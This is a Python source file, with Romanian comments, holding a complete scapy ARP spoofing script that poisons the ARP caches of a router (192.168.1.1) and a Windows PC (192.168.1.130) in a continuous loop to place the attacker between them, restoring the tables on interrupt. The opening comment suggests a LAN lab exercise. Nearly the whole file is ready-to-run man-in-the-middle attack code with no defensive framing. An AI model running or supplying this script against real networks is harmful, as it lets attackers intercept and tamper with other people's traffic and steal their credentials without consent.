import scapy.all as scapy

# ARP spoffing este facut in LAN, fara docker, nu am mai folosit docker

# functie pentru a restabili setarile implicite ale tabelei ARP
def restabilire_arp(destinatie_ip, sursa_ip):
    # obtinerea adreselor MAC reale ale destinatiei si sursei
    mac_tinta = obtine_mac(destinatie_ip)  # obtinem adresa MAC a destinatiei (ex. router)
    mac_sursa = obtine_mac(sursa_ip)  # obtinem adresa MAC a sursei (ex. windows PC)
    
    # crearea pachetului ARP pentru restabilire
    pachet = scapy.ARP(op=2, pdst=destinatie_ip, hwdst=mac_tinta, psrc=sursa_ip, hwsrc=mac_sursa)
    
    # trimiterea pachetului ARP
    scapy.send(pachet, verbose=False)

# functie pentru a obtine adresa MAC a unui IP dat
def obtine_mac(ip):
    # cream o cerere ARP care contine IP-ul destinatiei
    cerere_arp = scapy.ARP(pdst=ip)
    
    # cream un pachet de difuzare (broadcast)
    difuzare = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    
    # concatenam pachetele ARP si broadcast
    pachet_final = difuzare / cerere_arp
    
    # trimitem pachetul si primim raspunsul ARP
    raspuns = scapy.srp(pachet_final, timeout=2, verbose=False)[0]
    
    # obtinem adresa MAC din raspuns (este in campul src deoarece este un raspuns)
    mac = raspuns[0][1].hwsrc
    return mac

# functie pentru a trimite pachetul ARP de spoofing catre tinta, pretinzand ca suntem spoofed
def spoofing(tinta_ip, spoofed_ip):
    # obtinem adresa MAC a tintei
    mac_tinta = obtine_mac(tinta_ip)
    
    # generam pachetul ARP spoofed modificand sursa si tinta
    pachet = scapy.ARP(op=2, hwdst=mac_tinta, pdst=tinta_ip, psrc=spoofed_ip)
    
    # trimitem pachetul ARP
    scapy.send(pachet, verbose=False)

# functia principala
def main():
    try:
        while True:
            # trimitem pachetul spoofing catre router, pretinzand ca suntem PC-ul Windows
            spoofing("192.168.1.1", "192.168.1.130")  # router (destinatie, sursa -> masina atacatorului)
            
            # trimitem pachetul spoofing catre PC-ul Windows, pretinzand ca suntem router-ul
            spoofing("192.168.1.130", "192.168.1.1")  # PC Windows (destinatie, sursa)
    except KeyboardInterrupt:
        # cand procesul este oprit, restabilim setarile implicite ale tabelei ARP
        print("[!] Proces oprit. Restabilirea setarilor implicite... va rugam sa asteptati")
        restabilire_arp("192.168.1.1", "192.168.1.130")  # restabilim ARP pentru router
        restabilire_arp("192.168.1.130", "192.168.1.1")  # restabilim ARP pentru PC Windows
        exit(0)

# verificam daca scriptul este rulat direct
if __name__ == "__main__":
    main()
